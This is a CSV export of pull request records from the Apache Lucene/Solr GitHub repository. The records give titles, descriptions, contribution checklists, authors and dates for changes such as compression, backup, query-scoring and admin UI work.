"","1998","LUCENE-9455: ExitableTermsEnum should sample timeout and interruption check before calling next()","# Description  ExitableTermsEnum should sample timeout and interruption check before calling next()  # Solution  Add the same sampling logic as in https://github.com/elastic/elasticsearch/blob/4af4eb99e18fdaadac879b1223e986227dd2ee71/server/src/main/java/org/elasticsearch/search/internal/ExitableDirectoryReader.java#L164-L168  # Tests Updated unit test to test for sampling skipping check  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-10-17T02:25:06Z","2020-10-25T09:59:14Z"
"","1894","SOLR-14878: Expose solr.xml's coreRootDirectory property via the System Settings API","# Description  Even if coreRootDirectory was set in solr.xml, external applications could not access it through the API. It was not exposed. This means it is not possible to run a command such as *bin/solr create_core -c test* as the code that pre-populates the core directory is doing it in the wrong place (if at all).  # Solution Expose the property if it is defined and is different from solr_home   # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`.","closed","","arafalov","2020-09-20T01:07:46Z","2020-09-21T18:49:49Z"
"","2302","LUCENE-9663: Adding compression to terms dict from SortedSet/Sorted D…","# Description  Elasticsearch keyword field uses SortedSet DocValues. In our applications, “keyword” is the most frequently used field type. LUCENE-7081 has done prefix-compression for docvalues terms dict. We can do better by adding LZ4 compression to current prefix-compression. In one of our application, the dvd files were ~41% smaller with this change(from 1.95 GB to 1.15 GB).  This improvement is only for the high-cardinality fields.  # Tests  See Jira [LUCENE-9663](https://issues.apache.org/jira/browse/LUCENE-9663) for details.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","jaisonbi","2021-02-04T13:44:25Z","2021-07-16T06:14:06Z"
"","2213","LUCENE-9663: Adding compression to terms dict from SortedSet/Sorted DocValues","# Description  Elasticsearch keyword field uses SortedSet DocValues. In our applications, “keyword” is the most frequently used field type. LUCENE-7081 has done prefix-compression for docvalues terms dict. We can do better by adding LZ4 compression to current  prefix-compression. In one of our application, the dvd files were ~41% smaller with this change(from 1.95 GB to 1.15 GB).  This feature is only for the high-cardinality fields.   # Tests  See Jira LUCENE-9663 for details.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","jaisonbi","2021-01-17T16:07:54Z","2021-02-04T10:24:32Z"
"","1683","SOLR-14435: Update collection management docs on RESTORE","# Description  document missing parameters  # Solution  Refguide fix","closed","","epugh","2020-07-20T14:21:51Z","2020-08-13T14:52:03Z"
"","1794","SOLR-14783: Remove DIH from 9.0","# Description  DIH has been deprecated in 8.6 and was marked to remove in 9.0  # Solution  This removes DIH and vast majority of its references. (Should probably be squashed on merge, it was split into many commits for ease of review.)  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `ant precommit` and the appropriate test suite. - [X] I have added/removed documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-08-28T03:52:40Z","2020-08-29T14:52:05Z"
"","1800","SOLR-14786: Delete ancient patch file","# Description  dev-tools/scripts/SOLR-2452.patch.hack.pl is not used for anything for many years, but still shows up in cleanup searches.  # Solution  Just delete it.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-08-29T20:28:14Z","2020-08-31T12:41:36Z"
"","2205","LUCENE-9668: Deprecate MinShouldMatchSumScorer with WANDScorer","# Description  Deprecate MinShouldMatchSumScorer with WANDScorer since the two are very similar at this point. This is a follow-up PR to https://github.com/apache/lucene-solr/pull/2141 .  # Solution  As `WANDScorer` can already handle the cases where `scoreMode.needsScore() == true`, and `MinShouldMatchSumScorer` can handle the cases where `scoreMode.needsScore() == false` , this PR deprecates `MinShouldMatchSumScorer` with `WANDScorer` primarily by skipping block-max scoring update related logic when `scoreMode.needsScore() == false`.     # Tests  The existing tests as well as 3 newly added tests are passing (currently the nocommit comment fails validation check).   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2021-01-15T06:37:51Z","2021-01-25T07:41:05Z"
"","1728","SOLR-14596: equals/hashCode for common SolrRequest classes","# Description  Currently, many SolrRequest classes (e.g. UpdateRequest) don't implement `equals()` or `hashCode()`.  This isn't a problem for Solr's normal operation, but it can be a barrier in unit testing SolrJ client code. `equals()` implementations would make it much easier to assert that client code is building the request that developers think it's building.  # Solution  This takes the first baby step towards remedying this by adding `equals` and `hashCode` implementations for a few SolrRequest implementations.  Specifically the base SolrRequest, UpdateRequest, and CollectionAdminRequest and all its subclasses.  In an effort to simplify, I've standardized on using EqualsBuilder/HashCodeBuilder for these classes.  It relies on apache-commons, but since that's already a dependency of SolrJ I don't think this is a problem.  It results in much simpler code than writing the required logic by hand.  # Tests  None yet but some forthcoming.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gerlowskija","2020-08-08T01:58:54Z","2020-08-18T19:12:43Z"
"","2360","SOLR-13608: Incremental backup file format (#2250)","# Description  Currently backups in SolrCloud are done as full snapshots.  The full index is uploaded each time, even if many of the files are unchanged since the last backup.  # Solution  This commit introduces a new way for Solr to do backups (with a new underlying file structure).  This new ""incremental"" backup process improves over the existing backup mechanism in several ways:  - multiple backups ""points"" can now be stored at a given backup   location/name, allowing users to choose which point in time they want   to restore - subsequent backups skip over uploading files that were uploaded by   previous backups, saving time and network time. - files are checksumed as they're uploaded, ensuring that corrupted   indices aren't persisted and accidentally restored later.  Incremental backups are now the default, and traditional backups should now be considered 'deprecated' but can still be created by passing an `incremental=false` parameter on backup requests.  # Tests  See TestIncrementalCoreBackup, TestStressIncrementalBackup, HdfsBackupRepositoryIntegrationTest, LocalFSCloudIncrementalBackupTest, and HdfsCloudIncrementalBackupTest among others.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have run `ant precommit test`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-02-12T15:04:19Z","2021-02-12T21:39:05Z"
"","1976","LUCENE-9578: TermRangeQuery empty string lower bound edge case","# Description  Currently a TermRangeQuery with the empty String ("""") as lower bound and includeLower=false leads internally constructs an Automaton that doesn't match anything. This is unexpected expecially for open upper bounds where any string should be considered to be ""higher"" than the empty string.  # Solution  This PR changes ""Automata#makeBinaryInterval"" so that for an empty string lower bound and an open upper bound, any String should match the query regardless or the includeLower flag.  # Tests  Added two new tests to `TestAutomaton`.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check` - [x] I have added tests for my changes.","closed","","cbuescher","2020-10-12T15:48:06Z","2020-10-16T17:20:33Z"
"","2436","SOLR-15161: Lets not encourage users to hack mime types on JSON responses.","# Description  Browsers now care if you are doing a JSONP call and they expect application/json, and block any text/plain mime type response.  In Quepid we communicate the API command to update your JSONResponseWriter during your setup process, but it's still very confusing.  It was a ""cool hack"" back when we first used it, but 10 years later, it's causing issues.  # Solution Remove hack, and add warning in the docs if you choose to do it.  # Tests  Reran tests.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-27T14:58:01Z","2021-03-18T23:35:23Z"
"","2161","LUCENE-9646: Set BM25Similarity discountOverlaps via the constructor","# Description  BM25Similarity discountOverlaps parameter can be set with org.apache.lucene.search.similarities.BM25Similarity#setDiscountOverlaps method. But this method makes BM25Similarity mutable.   # Solution  discountOverlaps should be set via the constructor and setDiscountOverlaps method should be removed to make BM25Similarity immutable. This change allows BM25SimilarityFactory to waste less objects by creating an instance of BM25Similarity when the init method is called, and not every time the getSimilarity method is called.  # Tests  all tests involving BM25Similarity and LegacyBM25Similarity have been updated  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","patrickmarty","2020-12-22T16:46:25Z","2021-01-19T08:52:17Z"
"","2128","SOLR-14987: Reuse HttpSolrClient per node vs. one per Solr core when using CloudSolrStream","# Description  Backport of #2067 to `branch_8x`; see original PR for detailed description and checklist.","closed","","thelabdude","2020-12-07T18:13:04Z","2020-12-07T18:17:57Z"
"","2056","SOLR-14971: Handle atomic-removes on uncommitted docs","# Description  Atomic Update 'remove' operations currently fail on several numeric fieldtypes when the ""existing"" doc hasn't been committed yet and is fetched from the UpdateLog.  # Solution  Modify logic for ""remove"" operation in AtomicUpdateDocumentMerger to check for comparable but different types (e.g. Long vs Integer).  # Tests  Manual testing for XML/JSON/javabin requests.  Automated tests for Javabin and XML formats.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2020-11-02T19:59:07Z","2020-11-11T17:28:17Z"
"","2380","SOLR-15087: Allow restoration to existing collections","# Description  As originally implemented, SolrCloud's `restore` operation only supported restoring to collections that didn't yet exist.  This was primarily done out of a fear of race conditions involving writes to the collection.  Since then the support for toggling a per-collection ""readonly"" property has made restoration to existing collections possible, but unimplemented.  # Solution  This PR adds a codepath to restore to an existing collection, assuming it is compatible with the stored backup files. (A backup with 2 shards can't be restored to a collection with 3, etc.).  If the collection doesn't exist, the restoration process continues to create it as it has done done in the past.  # Tests  Manual testing, and automated tests added to AbstractIncrementalBackupTest.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-02-16T18:29:54Z","2021-03-19T22:00:06Z"
"","1991","SOLR-14933: Ability to add T and P type replica from admin UI","# Description  As of now we can already add NRT replica from admin UI. Would look to add drop down listing all types of replicas along with the live nodes drop down. With my personal experience replica type, is utmost crucial and it is really annoying to add replica from API every time.  # Solution  Here is how the interface looks like now. let me know if it's looks good or any other adjustment is required.","closed","hacktoberfest-accepted,","poke19962008","2020-10-16T10:34:42Z","2020-10-16T15:38:36Z"
"","1875","SOLR-14802: Allow LLPSF fields as geodist argument","# Description  Allows LLPSF fields to be used as arguments to geodist function  # Solution  Moves resolving of field arguments from FunctionQParser to GeoDistValueSourceParser where the required strategy can be used, same as for existing sfield support  # Tests  Tests multiple usages of geodist in same query, with arguments of type LatLonPointSpatialField and without  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","tommedge","2020-09-15T12:39:48Z","2020-09-21T03:36:07Z"
"","2430","SOLR-15194: relax requirements and allow http urls.","# Description  Allow `http` urls to work, albeit with a warning.  # Solution  Add the `http` protocol, and log a warning about this not being super secure!  # Tests  Tweaked the unit tests, and tested manually with Keycloak (which out of the box docker image version doesn't support https!).  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-24T20:38:21Z","2021-02-27T14:13:52Z"
"","1904","SOLR-14878: Expose solr.xml's coreRootDirectory property via the System Settings API (part 2)","# Description  Adjustment based on comments in - merged - #1894  # Solution  1. Shorten the name solr_core_root->core_root 2. Always return the value, even if not explicitly defined","closed","","arafalov","2020-09-21T22:27:17Z","2020-09-22T02:56:09Z"
"","2401","SOLR-11646: Add v2 examples for collections API","# Description  Adding V2  examples for the Collections API  # Solution  Copying the pattern in the `configsets-api.adoc`, however I have introduced a NEW way of listing out a CURL command, inspired by our friends writing Elasticsearch docs, that I think is more Cut'n'Paste friendly for when we have lots of JSON.  I'd love feedback on this reworked layout.  # Tests  Visually read the ref guide.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-18T20:02:37Z","2021-03-19T00:29:23Z"
"","2404","LUCENE-9639: Add unit tests for SimpleTextVector format","# Description  Added unit tests for SimpleTextVector format, and made a few changes in SimpleTextVectorReader and SimpleTextVectorWriter to pass the tests   # Solution  Added unit tests for SimpleTextVector format by extending BaseVectorFormatTestCase  # Tests  * Added unit tests for SimpleTextVector format by extending BaseVectorFormatTestCase * Tests passed but the nocommit comment is currently failing pre-commit  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2021-02-19T05:54:43Z","2021-02-24T20:37:34Z"
"","1673","LUCENE-9429 missing semicolon in overview.html","# Description  Add a missing semicolon in the documentation.  # Solution  self-explanatory  # Tests  Does not apply.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes.","closed","","zenogantner","2020-07-15T16:30:47Z","2020-07-24T21:21:59Z"
"","2326","LUCENE-9747: deal with NPE when package-info.java missing in the error messaging","# Description  _This is a replacement PR for https://github.com/apache/lucene-solr/pull/2325 that had extra files along.  (not quite up on force push and rebase!)_  Missing `package-info.java` causes a NPE in the javadocs task and is not obvious what went wrong!  # Solution  Look for the very specific situation, and then don't include the `Element` in the `reporter.print()` method.  Maybe this should be a more generic test, but I wanted to be careful of not breaking other things.  # Tests  Delete a `package-info.java`, and then run javadocs and you'll see the error!  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X ] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-08T21:41:40Z","2021-03-19T00:09:46Z"
"","1896","SOLR-14880: Support coreRootDirectory setting when create new cores from command line, in standalone mode","# Description  **bin/solr create_core -c test** was failing if solr.xml for the server defined coreRootDirectory different from solr_home. That's because the utility code was assuming solr_home, but was then failing when invoking the server that expected it somewhere else.  # Solution  Check for extra parameter being present and fall back to solr_home.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`.","closed","","arafalov","2020-09-20T03:54:04Z","2020-09-22T13:02:15Z"
"","2052","LUCENE-8982:  Make NativeUnixDirectory pure java with FileChannel direct IO flag, and rename to DirectIODirectory","# Description   Make NativeUnixDirectory pure java with FileChannel direct IO flag, and rename to DirectIODirectory  # Solution Use `ExtendedOpenOption.DIRECT` with `FileChannel` for direct IO Solution reference code sample in  * http://hg.openjdk.java.net/jdk10/master/rev/d72d7d55c765 * https://bugs.openjdk.java.net/browse/JDK-8189192    # Tests * Pass existing tests * Need new benchmarking tests   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","cleanup,","zacharymorn","2020-10-31T03:20:10Z","2021-01-17T22:57:57Z"
"","2023","LUCENE-9319: Clean up package name conflicts for sandbox module","""sandbox"" module shares package names o.a.l.codecs, o.a.l.document, and o.a.l.search with lucene-core. We have two choices to clean up these conflicts:  - Move them under `o.a.l.sandbox` (i.e., `o.a.l.sandbox.codecs`, `o.a.l.sandbox.document`, and `o.a.l.sandbox.search`)  and relax visibility of some classes/methods in ""core"" to public/protected to allow classes in sandbox module access those (currently package-private) classes/methods. - Move them to core module to keep package-private visibility in core module as is.  Here, I took the first option for all classes for the first step to resolve the conflicts. But that may be a rather wild approach; some classes probably should be moved to core (option 2).","closed","","mocobeta","2020-10-24T09:33:40Z","2020-11-03T03:01:04Z"
"","2658","SOLR-16194 Backport from solr project main, excluding new method that throws, per discussion.","","closed","","gus-asf","2022-05-18T12:45:41Z","2022-05-18T13:00:31Z"
"","2638","174234: We have observed that number of threads increases on one solr node after rebooting the solr node","","closed","","noblepaul","2022-02-07T12:10:46Z","2022-02-07T12:11:06Z"
"","2624","SOLR-15833","","closed","","madrob","2021-12-06T22:17:00Z","2021-12-15T00:10:35Z"
"","2619","SOLR-15813: Remove usage of Map.of from test","","closed","","thelabdude","2021-12-01T23:07:59Z","2021-12-01T23:08:09Z"
"","2616","Wipe content of `branch_8x` to prevent accidental commits.","","closed","","jpountz","2021-11-23T18:45:45Z","2021-11-24T16:26:13Z"
"","2615","SOLR-14412 NPE in MetricsHistoryHandler","","closed","","madrob","2021-11-19T19:16:12Z","2021-11-29T19:40:42Z"
"","2611","SOLR-15635: avoid redundant closeHooks invocation by MDCThreadPool","","closed","","mkhludnev","2021-11-15T21:11:18Z","2021-11-16T20:29:46Z"
"","2610","SOLR-15635: avoid redundant closeHooks invocation by MDCThreadPool","","closed","","mkhludnev","2021-11-15T20:59:43Z","2021-11-15T21:09:25Z"
"","2609","SOLR-15635: avoid redundant closeHooks invocation by MDCThreadPool","","closed","","mkhludnev","2021-11-15T07:14:16Z","2021-11-15T20:02:54Z"
"","2608","Feature/enable vault configuration","","closed","","liangfuxia","2021-11-12T10:47:48Z","2021-11-12T10:49:55Z"
"","2607","SOLR-15794: Switching a PRS collection from true -> false -> true results in INACTIVE replicas","","closed","","noblepaul","2021-11-12T02:32:58Z","2021-11-16T21:37:40Z"
"","2605","SOLR-15762: Detect invalid filter cache configuration during join","","closed","","thomaswoeckinger","2021-11-05T16:09:08Z","2021-11-09T05:25:17Z"
"","2603","SOLR-14438: Add simple attribution to methods and in LICENSE.txt","","closed","","janhoy","2021-11-04T13:27:13Z","2021-11-04T18:20:42Z"
"","2597","SOLR-15732 : queries to missing collection are slow","","open","","noblepaul","2021-11-01T06:39:26Z","2021-12-09T22:16:35Z"
"","2596","SOLR-15722: Delete Replica does not delete the Per replica state","","closed","","noblepaul","2021-10-27T06:39:23Z","2021-10-28T15:29:47Z"
"","2591","Backport ""LUCENE-10103 Make QueryCache respect Accountable queries (#346)""","","closed","","zhaih","2021-10-13T20:35:21Z","2021-10-13T21:37:10Z"
"","2578","SOLR-15555 Backporting unwraping queries","","closed","","madrob","2021-09-20T21:13:41Z","2021-09-20T22:25:13Z"
"","2562","Fix a DrillSideways unit test I broke when adding more tests in LUCENE-10060","","closed","","gsmiller","2021-08-26T20:49:41Z","2021-08-26T21:45:03Z"
"","2550","Test github action - DO NOT MERGE","","closed","","janhoy","2021-08-09T11:40:30Z","2021-08-09T11:41:48Z"
"","2518","Fix concurrency bug in DrillSidewaysQuery","","closed","","gsmiller","2021-06-24T18:36:39Z","2021-06-24T19:19:04Z"
"","2501","SOLR-15090: Allow backup storage in GCS","","closed","","gerlowskija","2021-05-26T13:36:18Z","2021-05-28T12:36:37Z"
"","2493","LUCENE-9575 Pattern Typing Filter - Backport","","closed","","gus-asf","2021-05-13T00:39:51Z","2021-05-13T00:41:46Z"
"","2485","LUCENE-9572 Backport from 9.0","","closed","","gus-asf","2021-04-29T00:46:29Z","2021-04-29T00:46:54Z"
"","2484","LUCENE-9574 CHANGES.txt entry","","closed","","gus-asf","2021-04-28T03:02:51Z","2021-04-28T03:03:04Z"
"","2481","SOLR-15337 Avoid XPath in solrconfig.xml parsing","","closed","","noblepaul","2021-04-20T06:21:38Z","2021-07-22T04:38:32Z"
"","2479","SOLR-15288: Hardening NODEDOWN event event in PRS mode","","closed","","noblepaul","2021-03-31T12:27:56Z","2021-07-22T04:38:32Z"
"","2478","SOLR-15303 sort core dropdown on admin index page","","closed","","costalopes71","2021-03-31T05:13:40Z","2021-03-31T14:31:50Z"
"","2475","[SOLR-15303] Sort core dropdown on admin index page","","closed","","costalopes71","2021-03-31T04:37:24Z","2021-03-31T05:00:05Z"
"","2470","document merge-based approach to updating existing PRs","","open","","magibney","2021-03-18T21:37:02Z","2021-03-22T13:41:10Z"
"","2448","SOLR-14759: a few initial changes so that Lucene can be built independently while Solr code is still in place.","","closed","","dweiss","2021-03-03T20:35:31Z","2021-03-08T13:59:09Z"
"","2431","SOLR-15146: remove unreachable code","","closed","","murblanc","2021-02-24T22:56:13Z","2021-02-24T23:08:20Z"
"","2411","SOLR-13696 Simplify routed alias tests to avoid flakiness, improve debugging","","open","","gus-asf","2021-02-22T00:31:22Z","2021-04-19T17:43:56Z"
"","2410","SOLR-15157: fix wrong assumptions on stats returned by Overseer when cluster state updates are distributed","","closed","","murblanc","2021-02-21T17:09:55Z","2021-02-21T18:05:01Z"
